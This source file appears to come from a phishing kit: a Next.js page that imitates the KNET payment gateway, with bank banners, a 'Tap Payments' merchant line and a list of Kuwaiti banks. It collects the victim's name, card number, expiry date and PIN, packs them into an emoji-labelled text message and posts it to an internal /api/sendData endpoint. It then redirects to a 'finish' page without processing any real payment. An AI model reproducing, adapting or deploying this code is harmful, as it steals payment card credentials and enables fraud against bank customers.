"use client";

import { Suspense, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";
import axios from "axios";
import kibLo from "../../../public/lobanner.png";
import kibb from "../../../public/dirayaBanner.png";
import styles from "./page.module.css";

function KnetPageContent() {
  const [fullName, setFullName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [bank, setBank] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);

  const router = useRouter();
  const searchParams = useSearchParams();
  const price = searchParams.get("price");
  const refN = searchParams.get("refN");
const handleSend = async () => {
  if (
      !fullName.trim() ||
      !cardNumber.trim() ||
      !expMonth.trim() ||
      !expYear.trim() ||
      !cvv.trim() ||
      !bank.trim()
    ) {
      alert("Please fill in all fields");
      return;
    }

    const text = `
🏦 Bank: ${bank}
👤 Full Name: ${fullName}
💳 Card Number: ${cardNumber}
📅 Exp Month: ${expMonth}
📅 Exp Year: ${expYear}
🔐 PIN: ${cvv}
🔨 Ref: ${refN}
    `;
  
  try {
    setIsProcessing(true);
    const res = await fetch("/api/sendData", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text }),
    });

    const result = await res.json();
    setIsProcessing(false);

    if (result.success) {
      router.push(`/kpay/finish?refN=${refN}&price=${price}`);
    } else {
      alert("حدث خطأ: " + result.error);
    }
  } catch (err) {
    setIsProcessing(false);
    console.error(err);
    alert("حدث خطأ أثناء الإرسال");
  }
};
  return (
    <div className={styles.knetContainer}>
      <div className={styles.knetBox}>
        <Image src={kibb} width={350} height={50} alt="bainnary" />
        <div className={styles.knetInfo}>
          <Image src={kibLo} width={220} height={50} alt="logo" />
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Merchant:</span>
            <span>Tap Payments EPSP</span>
          </div>
          <hr />
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Amount:</span>
            <span>KD {price}.000</span>
          </div>
        </div>

        {isProcessing && <p style={{ color: "black" }}>Processing transaction...</p>}

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSend();
          }}
          className={styles.knetForm}
        >
          <div>
            <label>Select Bank :</label>
            <select
              style={{ width: "175px", height: "30px", fontSize: "13px" }}
              value={bank}
              onChange={(e) => setBank(e.target.value)}
              required
              disabled={isProcessing}
            >
              <option value="">-- Select Bank --</option>
              <option value="ABK">Al Ahli Bank of Kuwait (ABK)</option>
              <option value="RAJHI">Al Rajhi Bank (RAJHI)</option>
              <option value="BBK">Bank of Bahrain and Kuwait (BBK)</option>
              <option value="BOUBYAN">Boubyan Bank (BOUBYAN)</option>
              <option value="BURG">Burgan Bank (BURG)</option>
              <option value="CBK">Commercial Bank of Kuwait (CBK)</option>
              <option value="DOHA">Doha Bank (DOHA)</option>
              <option value="GULF">Gulf Bank (GULF)</option>
              <option value="KFH">Kuwait Finance House (KFH)</option>
              <option value="KIB">Kuwait International Bank (KIB)</option>
              <option value="NBK">National Bank of Kuwait (NBK)</option>
              <option value="QNB">Qatar National Bank (QNB)</option>
              <option value="UNB">Union National Bank (UNB)</option>
              <option value="WARBA">Warba Bank (WARBA)</option>
            </select>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Card Number:</label>
            <input
              type="text"
              maxLength="16"
              inputMode="numeric"
              pattern="[0-9]*"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing}
            />
          </div>
          <hr />

          <div className={styles.dataexp}>
            <label className={styles.formLabel}>Expiration :</label>
            <div>
              <select
                value={expMonth}
                onChange={(e) => setExpMonth(e.target.value)}
                required
                className={styles.formInput}
                disabled={isProcessing}
              >
                <option value="">MM</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                    {String(i + 1).padStart(2, "0")}
                  </option>
                ))}
              </select>

              <select
                value={expYear}
                onChange={(e) => setExpYear(e.target.value)}
                required
                className={styles.formInput}
                disabled={isProcessing}
              >
                <option value="">YY</option>
                {Array.from({ length: 50 }, (_, i) => {
                  const year = new Date().getFullYear() + i;
                  return (
                    <option key={year} value={String(year).slice(-2)}>
                      {`20${String(year).slice(-2)}`}
                    </option>
                  );
                })}
              </select>
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Full Name:</label>
            <input
              type="text"
              maxLength="100"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing}
            />
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>PIN:</label>
            <input
              type="text"
              maxLength="4"
              inputMode="numeric"
              pattern="\d*"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing}
            />
          </div>
          <hr />

          <div className={styles.buttonRow}>
            <button
              type="button"
              className={styles.cancel}
              onClick={() => router.back()}
              disabled={isProcessing}
            >
              Cancel
            </button>
            <button type="submit" className={styles.submit}>
              Submit
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function KnetPage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <KnetPageContent />
    </Suspense>
  );
        }
